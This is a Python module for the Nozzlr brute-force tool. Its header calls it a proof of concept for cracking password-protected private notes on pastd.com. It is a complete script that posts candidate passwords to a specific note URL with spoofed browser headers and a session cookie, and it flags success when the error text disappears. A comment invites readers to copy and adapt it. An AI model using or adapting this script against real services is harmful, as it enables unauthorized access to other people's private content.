## Nozzlr module : HTTP - POST bruteforcer (PoC: breaking pastd.com private notes)
# @author intrd - http://dann.com.br/ 
# @license Creative Commons Attribution-ShareAlike 4.0 International License - http://creativecommons.org/licenses/by-sa/4.0/

# Make a copy of this module and adapt to your task!

import urllib, shutil, json
import requests

def nozz_module(payload, self=False, founds=False):
	payloads=':'.join(str(v) for v in payload.values())

	## Configs
	host="pstd.com"
	target="http://"+host+"/9f20df16"
	cookie="PHPSESSID=ahd8fj39jkrf0934k40dk"
	headers = {
	    "Host": ""+host+"",
	    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0",
	    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
	    "Accept-Language": "en-US,en;q=0.5",
	    "Accept-Encoding": "gzip, deflate",
	    "Referer": "http://"+host+"/4058459a",
	    "Cookie": ""+cookie,
	    "Connection": "close",
	    "Content-Type": "application/x-www-form-urlencoded",
	}
	postdata = {'password_9f20df16': payload[0]} 

	## Engine
	out={}
	out["code"]=""
	out["result"]=""
	code="null"
	try:
		r = requests.post(target, data=postdata, headers=headers)
	except requests.exceptions.RequestException as e:
		#print " "
		out["result"]=format(str(e)).strip()
		out["code"]="error"
		return out
	if "Enter the correct password below" in r.content:
		out["code"]="NEXT"
	else:
		out["code"]="found: \""+payloads+"\""
	return out
		